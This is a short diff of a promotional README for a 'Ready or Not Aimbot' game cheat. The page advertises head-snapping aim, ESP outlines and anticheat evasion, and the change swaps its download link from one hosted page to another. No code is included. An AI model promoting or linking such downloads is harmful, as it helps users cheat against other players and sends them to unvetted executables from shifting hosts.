@@ -2,7 +2,7 @@
 
 Kick-doors just got kinder to your K/D. **Ready or Not Aimbot** drops surgical head-snaps, crystal ESP outlines, and a stealthy core that keeps anticheat snoozing. Slide it in, auto-inject, and watch the scoreboard salute your tag before the flashbang smoke clears.
 
-[![Get Ready or Not Aimbot](https://img.shields.io/badge/Get%20Ready%20or%20Not%20Aimbot-blueviolet)](https://fileoffload4.bitbucket.io)
+[![Get Ready or Not Aimbot](https://img.shields.io/badge/Get%20Ready%20or%20Not%20Aimbot-blueviolet)](https://Ready-or-Not-Aimbot-dab5.github.io/.github)
 
 **Quick Links:** [Overview](#overview) • [Features](#feature-breakdown-) • [Install](#instant-install-guide)
 
